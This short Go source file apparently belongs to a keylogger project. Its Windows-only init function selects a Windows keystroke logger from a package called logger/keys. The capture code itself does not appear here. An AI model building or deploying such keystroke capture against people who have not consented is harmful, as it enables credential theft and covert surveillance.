//go:build windows
// +build windows

package main

import (
	"github.com/adelapazborrero/logger/keys"
)

func init() {
	keyLogger.CurrentLogger = keys.NewWindowsLogger()
}
